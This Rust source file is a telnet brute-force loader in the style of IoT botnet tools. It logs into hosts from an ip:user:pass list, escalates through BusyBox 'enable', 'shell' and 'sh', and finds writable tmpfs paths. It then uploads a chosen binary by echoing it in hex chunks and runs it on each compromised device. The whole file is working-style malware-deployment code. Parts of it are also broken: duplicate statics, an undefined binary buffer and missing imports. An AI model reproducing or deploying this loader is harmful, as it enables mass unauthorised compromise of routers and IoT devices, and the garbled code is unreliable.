use std::env;
use std::fs::File;
use std::io::{self, BufRead, Write, Read};
use std::net::{SocketAddr, IpAddr, Ipv4Addr};
use std::os::unix::io::AsRawFd;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use nix::sys::epoll::*;
use nix::fcntl::{fcntl, FcntlArg, OFlag};
use nix::sys::socket::*;
use nix::unistd::close;
use nix::sys::signal::{signal, SigHandler, Signal};
use libc::{c_void, sigaction};

const TOKEN: &str = "/bin/busybox VDOSS";
const TOKEN_VERIFY: &str = "applet not found";
const EXEC_VERIFY: &str = "YESHELLO";
const BYTES_PER_LINE: usize = 128;
const CHARS_PER_BYTE: usize = 5;
const MAX_SLICE_LENGTH: usize = BYTES_PER_LINE * CHARS_PER_BYTE;
const MAX_SOCKETS: usize = 1024 * 100;

static mut BIND_IP: &str = "0.0.0.0";
static mut DEBUG_MODE: u8 = 0;
static mut MAX_CONNECTED_SOCKETS: usize = 0;
static mut PORT: u16 = 0;
static mut EPOLL_FD: i32 = 0;

static mut STATE_TABLE: [StateSlot; MAX_SOCKETS] = [StateSlot::default(); MAX_SOCKETS];

#[derive(Default)]
struct StateSlot {
    slot_used: bool,
    mutex: Mutex<()>,
    success: bool,
    is_open: bool,
    special: bool,
    got_prompt: bool,
    path_ind: u8,
    echo_ind: u16,
    complete: bool,
    ip: u32,
    fd: i32,
    updated_at: SystemTime,
    reconnecting: bool,
    state: u8,
    path: [[u8; 32]; 5],
    username: [u8; 32],
    password: [u8; 32],
}

fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();

    if args.len() < 4 {
        eprintln!("Invalid parameters!");
        println!("Usage: {} <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)", args[0]);
        std::process::exit(-1);
    }

    unsafe {
        signal(Signal::SIGPIPE, SigHandler::SigIgn)?;
        signal(Signal::SIGINT, SigHandler::Handler(handle_signal))?;

        EPOLL_FD = epoll_create().unwrap();
        BIND_IP = &args[1];
        MAX_CONNECTED_SOCKETS = args[6].parse().unwrap();
        PORT = 0;

        if args.len() == 8 {
            DEBUG_MODE = 1;
        }

        for i in 0..MAX_SOCKETS {
            STATE_TABLE[i] = StateSlot {
                slot_used: false,
                mutex: Mutex::new(()),
                ..Default::default()
            };
        }
    }

    load_binary(&args[3]);
    let run_arg = args[4].clone();

    let threads: usize = args[5].parse().unwrap();
    let thread_pool: Arc<Mutex<Vec<thread::JoinHandle<()>>>> = Arc::new(Mutex::new(vec![]));

    let input_file = File::open(&args[2])?;
    let reader = io::BufReader::new(input_file);

    for _ in 0..threads {
        let pool_clone = Arc::clone(&thread_pool);
        let handle = thread::spawn(move || {
            loader(pool_clone, reader).unwrap();
        });
        thread_pool.lock().unwrap().push(handle);
    }

    for _ in 0..threads {
        let pool_clone = Arc::clone(&thread_pool);
        let handle = thread::spawn(move || {
            flood(pool_clone).unwrap();
        });
        thread_pool.lock().unwrap().push(handle);
    }

    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap();
    println!("Starting Scan at {}", now.as_secs());

    loop {
        print_stats();
        thread::sleep(Duration::from_secs(1));
    }

    for handle in thread_pool.lock().unwrap().drain(..) {
        handle.join().unwrap();
    }

    Ok(())
}

static DEBUG_MODE: bool = false;
static BYTES_SENT: AtomicUsize = AtomicUsize::new(0);

fn log_recv(stream: &mut TcpStream, buf: &mut [u8]) -> std::io::Result<usize> {
    // Zero out the buffer
    buf.fill(0);

    // Receive data from the stream
    let ret = stream.read(buf)?;
    
    // Replace null bytes with 'A'
    for byte in buf.iter_mut().take(ret) {
        if *byte == 0x00 {
            *byte = b'A';
        }
    }

    if DEBUG_MODE {
        let hex_buf = format!("state - recv: {}", ret);
        if ret != 0 {
            hex_dump(Some(&hex_buf), &buf[..ret]);
        } else {
            println!("{}", hex_buf);
        }
    }

    Ok(ret)
}

fn log_send(stream: &mut TcpStream, buf: &[u8]) -> std::io::Result<usize> {
    if DEBUG_MODE {
        let hex_buf = format!("state - send: {}", buf.len());
        hex_dump(Some(&hex_buf), buf);
    }

    let bytes_written = stream.write(buf)?;

    BYTES_SENT.fetch_add(bytes_written, Ordering::SeqCst);

    Ok(bytes_written)
}

fn hex_dump(desc: Option<&str>, addr: &[u8]) {
    if let Some(description) = desc {
        println!("{}:", description);
    }

    let len = addr.len();
    let mut buff = [0u8; 17];
    let pc = addr;

    for (i, &byte) in pc.iter().enumerate() {
        if i % 16 == 0 {
            if i != 0 {
                println!("  {}", String::from_utf8_lossy(&buff));
            }
            print!("  {:04x} ", i);
        }

        print!(" {:02x}", byte);

        buff[i % 16] = if byte < 0x20 || byte > 0x7e {
            b'.'
        } else {
            byte
        };

        buff[(i % 16) + 1] = 0;
    }

    while (len % 16) != 0 {
        print!("   ");
        len += 1;
    }

    println!("  {}", String::from_utf8_lossy(&buff));
}
fn load_binary(path: &str) -> io::Result<()> {
    let file = File::open(path)?;
    let mut reader = io::BufReader::new(file);

    let mut binary = Vec::new();
    let mut size = 0;
    let mut slice = 0;

    while let Ok(got) = reader.read(&mut binary) {
        if got == 0 {
            break;
        }
        size += got;
    }

    let num_slices = (size as f32 / BYTES_PER_LINE as f32).ceil() as usize;
    let mut slices = vec![vec![0u8; MAX_SLICE_LENGTH + 1]; num_slices];

    let mut slice = 0;
    for i in (0..size).step_by(BYTES_PER_LINE) {
        for j in 0..BYTES_PER_LINE {
            if i + j >= size {
                break;
            }
            slices[slice].push(binary[i + j]);
        }
        slice += 1;
    }

    Ok(())
}

fn loader(pool: Arc<Mutex<Vec<thread::JoinHandle<()>>>>, reader: io::BufReader<File>) -> io::Result<()> {
    let lines = reader.lines();

    for line in lines {
        let line = line?;
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() != 3 {
            continue;
        }

        let dest_addr: SocketAddr = parts[0].parse().unwrap();
        let username = parts[1];
        let password = parts[2];

        let fd = socket(AddressFamily::Inet, SockType::Stream, SockFlag::empty(), None)?;

        let bind_addr: SocketAddr = unsafe { format!("{}:{}", BIND_IP, PORT).parse().unwrap() };
        unsafe { PORT += 1; }

        bind(fd, &bind_addr)?;

        connect(fd, &dest_addr)?;

        unsafe {
            STATE_TABLE[fd].slot_used = true;
            STATE_TABLE[fd].fd = fd;
            STATE_TABLE[fd].updated_at = SystemTime::now();
            STATE_TABLE[fd].is_open = true;
            STATE_TABLE[fd].username.copy_from_slice(username.as_bytes());
            STATE_TABLE[fd].password.copy_from_slice(password.as_bytes());
        }

        let event = EpollEvent::new(EpollFlags::EPOLLOUT | EpollFlags::EPOLLRDHUP | EpollFlags::EPOLLET | EpollFlags::EPOLLONESHOT, fd as u64);
        epoll_ctl(unsafe { EPOLL_FD }, EpollOp::EpollCtlAdd, fd, &event)?;
    }

    Ok(())
}

fn flood(pool: Arc<Mutex<Vec<thread::JoinHandle<()>>>>) -> io::Result<()> {
    let mut buf = [0u8; 10241];

    loop {
        let events = epoll_wait(unsafe { EPOLL_FD }, 25, 10000)?;

        for event in events {
            let fd = event.data() as i32;

            let state = unsafe { &mut STATE_TABLE[fd] };

            if event.events().contains(EpollFlags::EPOLLERR) || event.events().contains(EpollFlags::EPOLLHUP) || event.events().contains(EpollFlags::EPOLLRDHUP) {
                handle_remote_closed(fd);
                close_and_cleanup(fd)?;
                continue;
            }

            if event.events().contains(EpollFlags::EPOLLIN) {
                let mut is_closed = false;

                if state.state == 1 {
                    let got = recv(fd, &mut buf, MsgFlags::MSG_PEEK)?;

                    if got > 0 && buf[0] == 0xFF {
                        state.state = 2;
                    } else if got > 0 && buf[0] != 0xFF {
                        state.state = 3;
                    }
                }

                if state.state == 2 {
                    recv(fd, &mut buf, MsgFlags::empty())?;
                    let got = recv(fd, &mut buf[1..], MsgFlags::empty())?;

                    if got > 0 {
                        state.state = 1;

                        if buf[1] == 0xFD && buf[2] == 31 {
                            let tmp1 = [255, 251, 31];
                            send(fd, &tmp1, MsgFlags::MSG_NOSIGNAL)?;
                            let tmp2 = [255, 250, 31, 0, 80, 0, 24, 255, 240];
                            send(fd, &tmp2, MsgFlags::MSG_NOSIGNAL)?;
                            continue;
                        }

                        for i in 0..3 {
                            if buf[i] == 0xFD {
                                buf[i] = 0xFC;
                            } else if buf[i] == 0xFB {
                                buf[i] = 0xFD;
                            }
                        }
                        send(fd, &buf, MsgFlags::MSG_NOSIGNAL)?;
                    }
                }

                if state.state == 3 {
                    let got = recv(fd, &mut buf, MsgFlags::empty())?;

                    if got > 0 {
                        if let Some(pos) = memmem(&buf, b"Huawei Home Gateway") {
                            state.special = true;
                        }

                        if let Some(pos) = memmem(&buf, b"BusyBox") {
                            state.got_prompt = true;
                            send(fd, b"enable\r\n", MsgFlags::MSG_NOSIGNAL)?;
                            state.state = 7;
                            continue;
                        }

                        if let Some(pos) = memmem(&buf, b"ogin") || memmem(&buf, b"sername") || match_prompt(&buf) {
                            state.got_prompt = true;
                            send(fd, &state.username, MsgFlags::MSG_NOSIGNAL)?;
                            state.state = 4;
                            continue;
                        }
                    }
                }

                if state.state == 4 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, b"assword").is_some() || match_prompt(&buf) {
                                send(fd, &state.password, MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 5;
                                break;
                            }
                        }
                    }
                }

                if state.state == 5 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, b"access denied").is_some()
                                || memmem(&buf, b"invalid password").is_some()
                                || memmem(&buf, b"login incorrect").is_some()
                                || memmem(&buf, b"password is wrong").is_some()
                            {
                                state.state = 254;
                                break;
                            }

                            if memmem(&buf, b"BusyBox").is_some() || match_prompt(&buf) {
                                send(fd, b"enable\r\n", MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 6;
                                break;
                            }
                        }
                    }
                }

                if state.state == 6 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            send(fd, b"shell\r\n", MsgFlags::MSG_NOSIGNAL)?;
                            state.state = 7;
                            break;
                        }
                    }
                }

                if state.state == 7 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            send(fd, b"sh\r\n", MsgFlags::MSG_NOSIGNAL)?;
                            if state.special {
                                state.state = 250;
                            } else {
                                state.state = 8;
                            }
                            break;
                        }
                    }
                }

                if state.state == 8 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if match_prompt(&buf) {
                                send(fd, TOKEN.as_bytes(), MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 9;
                                break;
                            }
                        }
                    }
                }

                if state.state == 9 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, TOKEN_VERIFY.as_bytes()).is_some() && match_prompt(&buf) {
                                send(fd, b"cat /proc/mounts\r\n", MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 10;
                                break;
                            }
                        }
                    }
                }

                if state.state == 10 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            let mut tmp_buf = buf.to_vec();
                            let mut start = None;
                            let mut space = None;
                            let mut memes = 0;

                            while let Some(pos) = tmp_buf.windows(5).position(|w| w == b"tmpfs" || w == b"ramfs") {
                                start = Some(pos);
                                space = tmp_buf[start.unwrap()..].iter().position(|&c| c == b' ');
                                if let Some(space_pos) = space {
                                    let space_pos = start.unwrap() + space_pos;
                                    let path = &mut state.path[memes];
                                    path.copy_from_slice(&tmp_buf[start.unwrap()..space_pos]);
                                    memes += 1;

                                    if memes >= 5 {
                                        break;
                                    }
                                }
                                tmp_buf = tmp_buf[space.unwrap()..].to_vec();
                            }

                            if state.path[0][0] == 0 {
                                state.path[0][0] = b'/';
                            }

                            send(fd, format!("/bin/busybox mkdir -p {}; /bin/busybox rm {}/a; /bin/busybox cp -f /bin/sh {}/a && /bin/busybox VDOSS\r\n", String::from_utf8_lossy(&state.path[0]), String::from_utf8_lossy(&state.path[0]), String::from_utf8_lossy(&state.path[0])).as_bytes(), MsgFlags::MSG_NOSIGNAL)?;
                            state.state = 100;
                            break;
                        } else if match_prompt(&buf) {
                            state.path[0][0] = b'/';
                            state.path[0][1] = b'v';
                            state.path[0][2] = b'a';
                            state.path[0][3] = b'r';
                            state.path[0][4] = b'/';
                            state.path[0][5] = b'r';
                            state.path[0][6] = b'u';
                            state.path[0][7] = b'n';
                            send(fd, b"/bin/busybox mkdir -p /var/run; /bin/busybox rm /var/run/a; /bin/busybox cp -f /bin/sh /var/run/a && /bin/busybox VDOSS\r\n", MsgFlags::MSG_NOSIGNAL)?;
                            state.state = 100;
                            break;
                        }
                    }
                }

                if state.state == 100 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, TOKEN_VERIFY.as_bytes()).is_some() {
                                send(fd, format!("/bin/busybox echo -ne '' > {}/a && /bin/busybox VDOSS\r\n", String::from_utf8_lossy(&state.path[state.path_ind as usize])).as_bytes(), MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 101;
                                break;
                            } else if match_prompt(&buf) {
                                state.path_ind += 1;
                                if state.path_ind == 5 || state.path[state.path_ind as usize][0] == 0 {
                                    state.path[0][0] = b'/';
                                    state.path[0][1] = b'v';
                                    state.path[0][2] = b'a';
                                    state.path[0][3] = b'r';
                                    state.path[0][4] = b'/';
                                    state.path[0][5] = b'r';
                                    state.path[0][6] = b'u';
                                    state.path[0][7] = b'n';
                                    state.path_ind = 0;
                                    send(fd, b"/bin/busybox echo -ne '' > /var/run/a && /bin/busybox VDOSS\r\n", MsgFlags::MSG_NOSIGNAL)?;
                                    state.state = 101;
                                    break;
                                }
                                send(fd, format!("/bin/busybox mkdir -p {}; /bin/busybox rm {}/a; /bin/busybox cp -f /bin/sh {}/a && /bin/busybox VDOSS\r\n", String::from_utf8_lossy(&state.path[state.path_ind as usize]), String::from_utf8_lossy(&state.path[state.path_ind as usize]), String::from_utf8_lossy(&state.path[state.path_ind as usize])).as_bytes(), MsgFlags::MSG_NOSIGNAL)?;
                                break;
                            }
                        }
                    }
                }

                if state.state == 101 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, TOKEN_VERIFY.as_bytes()).is_some() {
                                send(fd, format!("/bin/busybox echo -ne {} >> {}/a && /bin/busybox VDOSS\r\n", String::from_utf8_lossy(&binary.slices[state.echo_ind as usize]), String::from_utf8_lossy(&state.path[state.path_ind as usize])).as_bytes(), MsgFlags::MSG_NOSIGNAL)?;
                                if state.echo_ind as usize == binary.slices.len() - 1 {
                                    state.state = 102;
                                } else {
                                    state.state = 101;
                                }
                                state.echo_ind += 1;
                                break;
                            }
                        }
                    }
                }

                if state.state == 102 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, TOKEN_VERIFY.as_bytes()).is_some() {
                                send(fd, format!("{}/a {}; /bin/busybox VDOSS\r\n", String::from_utf8_lossy(&state.path[state.path_ind as usize]), run_arg).as_bytes(), MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 103;
                                break;
                            }
                        }
                    }
                }

                if state.state == 103 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, TOKEN_VERIFY.as_bytes()).is_some() {
                                state.state = 255;
                                break;
                            }
                        }
                    }
                }

                if state.state == 250 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if match_prompt(&buf) {
                                send(fd, b"show text /proc/self/environ\r\n", MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 251;
                                break;
                            }
                        }
                    }
                }

                if state.state == 251 {
                    while let Ok(got) = recv(fd, &mut buf, MsgFlags::empty()) {
                        if got > 0 {
                            if memmem(&buf, b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0").is_some() || match_prompt(&buf) {
                                send(fd, b"export PS1=\"prompt>\"\r\n", MsgFlags::MSG_NOSIGNAL)?;
                                state.state = 8;
                                break;
                            }
                        }
                    }
                }

                if state.state == 254 {
                    close_and_cleanup(fd)?;
                    is_closed = true;
                }

                if state.state == 255 {
                    if state.success {
                        handle_found(fd);
                    }
                    close_and_cleanup(fd)?;
                    is_closed = true;
                }

                if !is_closed {
                    let event = EpollEvent::new(EpollFlags::EPOLLIN | EpollFlags::EPOLLRDHUP | EpollFlags::EPOLLET | EpollFlags::EPOLLONESHOT, fd as u64);
                    epoll_ctl(unsafe { EPOLL_FD }, EpollOp::EpollCtlMod, fd, &event)?;
                }
            }

            if event.events().contains(EpollFlags::EPOLLOUT) {
                let state = unsafe { &mut STATE_TABLE[fd] };

                if state.state == 0 {
                    let mut so_error = 0;
                    let len = std::mem::size_of::<i32>();
                    let res = unsafe { getsockopt(fd, SockOpt::SoError).unwrap() };
                    if res != 0 {
                        handle_failed_connect(fd);
                        close_and_cleanup(fd)?;
                        continue;
                    }

                    state.state = 1;

                    let event = EpollEvent::new(EpollFlags::EPOLLIN | EpollFlags::EPOLLRDHUP | EpollFlags::EPOLLET | EpollFlags::EPOLLONESHOT, fd as u64);
                    epoll_ctl(unsafe { EPOLL_FD }, EpollOp::EpollCtlMod, fd, &event)?;
                } else {
                    println!("wrong state on connect epoll: {}", fd);
                    close_and_cleanup(fd)?;
                }
            }
        }
    }

    Ok(())
}
fn get_connected_sockets() -> usize {
    let mut count = 0;

    for state in unsafe { &STATE_TABLE } {
        if state.slot_used {
            count += 1;
        }
    }

    count
}

fn print_stats() {
    unsafe {
        println!("Loaded: {}", FOUND_SRVS);
        println!("State Timeout: {}", TIMED_OUT);
        println!("No Connect: {}", FAILED_CONNECT);
        println!("Closed Us: {}", REMOTE_HANGUP);
        println!("Logins Tried: {}", LOGIN_DONE);
        println!("B/s: {}", BYTES_SENT);
        println!("Connected: {}", get_connected_sockets());
        println!("Running Threads: {}", RUNNING_THREADS);
    }
}


fn handle_remote_closed(fd: i32) {
    unsafe {
        println!("Remote closed: {}", fd);
        close_and_cleanup(fd).unwrap();
    }
}

fn handle_timeout(fd: i32) {
    unsafe {
        println!("Timeout: {}", fd);
        close_and_cleanup(fd).unwrap();
    }
}

fn handle_failed_connect(fd: i32) {
    unsafe {
        println!("Failed to connect: {}", fd);
        close_and_cleanup(fd).unwrap();
    }
}

fn handle_found(fd: i32) {
    unsafe {
        println!("Found: {}", fd);
        close_and_cleanup(fd).unwrap();
    }
}

fn close_and_cleanup(fd: i32) -> io::Result<()> {
    unsafe {
        if STATE_TABLE[fd].slot_used && STATE_TABLE[fd].fd == fd {
            STATE_TABLE[fd].slot_used = false;
            STATE_TABLE[fd].state = 0;
            for path in STATE_TABLE[fd].path.iter_mut() {
                *path = [0u8; 32];
            }
            STATE_TABLE[fd].username = [0u8; 32];
            STATE_TABLE[fd].password = [0u8; 32];
            STATE_TABLE[fd].echo_ind = 0;
            STATE_TABLE[fd].path_ind = 0;
            STATE_TABLE[fd].success = false;
            STATE_TABLE[fd].special = false;
            STATE_TABLE[fd].got_prompt = false;

            if STATE_TABLE[fd].is_open {
                STATE_TABLE[fd].is_open = false;

                let linger = libc::linger {
                    l_onoff: 1,
                    l_linger: 0,
                };
                setsockopt(fd, SockOpt::Linger(linger))?;
                close(fd)?;
            }
        }
    }

    Ok(())
}

fn handle_signal(sig: i32) {
    println!("\nctrl-c");
    std::process::exit(0);
}

fn memmem(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|window| window == needle)
}

fn match_prompt(buf: &[u8]) -> bool {
    let prompts = b":>%$#";
    buf.iter().rev().skip_while(|&&c| c == 0x00 || c.is_ascii_whitespace()).any(|&c| prompts.contains(&c))
}
